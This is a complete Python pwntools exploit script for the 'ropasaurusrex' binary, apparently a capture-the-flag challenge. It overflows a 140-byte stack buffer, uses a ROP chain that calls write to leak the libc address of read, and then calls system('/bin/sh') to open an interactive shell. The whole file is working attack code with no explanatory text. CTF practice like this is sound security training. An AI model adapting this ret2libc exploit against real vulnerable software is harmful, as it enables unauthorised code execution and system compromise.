#!/usr/bin/env python
from pwn import *

context(os="linux", arch="i386")


def main():
    conn = process('./ropasaurusrex-85a84f36f81e11f720b1cf5ea0d1fb0d5a603c0d')
    elf = ELF('./ropasaurusrex-85a84f36f81e11f720b1cf5ea0d1fb0d5a603c0d')
    libc = ELF('/lib/i386-linux-gnu/libc-2.23.so')
    read = 0x80483f4

    # first payload
    payload = "A" * 140
    payload += p32(elf.plt['write'])
    payload += p32(read)
    payload += p32(1)  # stdout
    payload += p32(elf.got['read'])
    payload += p32(4)  # length

    conn.send(payload)
    leak_libc = u32(conn.recv(4)) - libc.symbols['read']

    # second payload
    payload = "A" * 140
    payload += p32(leak_libc + libc.symbols['system'])
    payload += p32(0xdeadbeef)  # pudding
    payload += p32(leak_libc + next(libc.search('/bin/sh')))

    conn.send(payload)
    conn.interactive()


if __name__ == "__main__":
    main()
